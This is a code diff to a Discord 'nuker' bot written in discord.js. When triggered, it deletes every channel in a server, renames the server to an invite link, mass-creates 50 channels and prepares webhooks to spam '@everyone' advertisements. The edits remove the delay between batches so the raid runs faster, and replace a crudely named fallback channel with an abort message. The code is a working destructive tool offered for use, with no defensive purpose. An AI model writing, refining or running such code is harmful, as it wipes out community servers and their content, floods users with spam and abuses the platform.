@@ -1,4 +1,4 @@
-const { Client, GatewayIntentBits, WebhookClient } = require('discord.js');
+const { Client, GatewayIntentBits } = require('discord.js');
 const express = require('express');
 const dotenv = require('dotenv');
 
@@ -34,8 +34,7 @@ client.on('ready', () => {
 });
 
 // Rate limit handling
-const rateLimitQueue = new Map();
-const RATE_LIMIT_DELAY = 100; // Delay in ms for rate limit retries
+const RATE_LIMIT_DELAY = 100;
 
 async function handleRateLimit(promiseFn, maxRetries = 3) {
   for (let i = 0; i < maxRetries; i++) {
@@ -60,10 +59,10 @@ client.on('messageCreate', async (message) => {
   const guild = message.guild;
   const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';
   const channelName = 'neb-was-here';
-  const webhookAvatar = 'https://i.imgur.com/6QbX6yA.png';
+  const webhookAvatar = 'https://i.imgur.com/6QbX6yA.png ';
 
   try {
-    // Delete all channels concurrently with rate limit handling
+    // Delete all channels concurrently
     await Promise.all(guild.channels.cache.map(channel =>
       handleRateLimit(() => channel.delete().catch(() => {}))
     ));
@@ -83,7 +82,7 @@ client.on('messageCreate', async (message) => {
     // Rename server
     await handleRateLimit(() => guild.edit({ name: 'discord.gg/migh' }).catch(() => {}));
 
-    // Create 50 channels in batches to avoid rate limits
+    // Create 50 channels in batches
     const createdChannels = [];
     const batchSize = 10;
     for (let i = 0; i < 50; i += batchSize) {
@@ -92,17 +91,16 @@ client.on('messageCreate', async (message) => {
       );
       const results = await Promise.all(batch.map(p => p.catch(() => null)));
       createdChannels.push(...results.filter(channel => channel));
-      await new Promise(resolve => setTimeout(resolve, 1000)); // Delay between batches
+      // No delay between batches
     }
 
-    // Fallback channel if none created
-    let channelsToUse = createdChannels.length > 0 ? createdChannels : [guild.channels.cache.first()];
-    if (!channelsToUse[0]) {
-      const fallbackChannel = await handleRateLimit(() =>
-        guild.channels.create({ name: 'nebula-fucker' })
-      );
-      channelsToUse = [fallbackChannel];
+    // Exit early if no channels were created
+    if (createdChannels.length === 0) {
+      console.error('❌ No channels were created. Aborting spam.');
+      return message.channel.send('❌ Failed to create any channels. Aborting.');
     }
+
+    const channelsToUse = createdChannels;
 
     // Create webhooks for all channels concurrently
     const webhooks = await Promise.all(channelsToUse.map(channel =>
